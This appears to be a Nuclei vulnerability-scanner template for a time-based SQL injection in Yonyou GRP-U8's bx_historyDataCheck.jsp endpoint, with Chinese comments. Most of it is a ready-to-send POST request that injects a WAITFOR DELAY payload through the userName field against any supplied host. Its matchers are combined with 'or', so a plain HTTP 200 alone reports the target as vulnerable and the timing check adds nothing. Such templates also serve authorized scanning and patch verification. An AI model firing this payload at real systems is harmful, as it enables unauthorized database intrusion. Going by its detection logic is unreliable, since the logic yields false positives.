id: yongyouOA-bx-historyDataCheck-jsp-SQL
info:
  name: 用友 GRP-U8 bx_historyDataCheck.jsp SQL注入漏洞
  author: cnaq
  severity: high  
  description: 用友 GRP-U8 bx_historyDataCheck.jsp SQL注入漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8B%20GRP-U8%20bx_historyDataCheck.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: yongyouOA,sql,injection 

requests:
  - raw:
      - |
        POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 53

        userName=';WAITFOR DELAY '0:0:5'--+&ysnd=&historyFlag=
        
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
      - type: dsl # DSL匹配
        dsl:
          - 'duration>=5'
          - 'duration<8' # 漏洞持续时间大于5秒，小于8秒
        condition: and # 将默认的 or 的关系改为 and
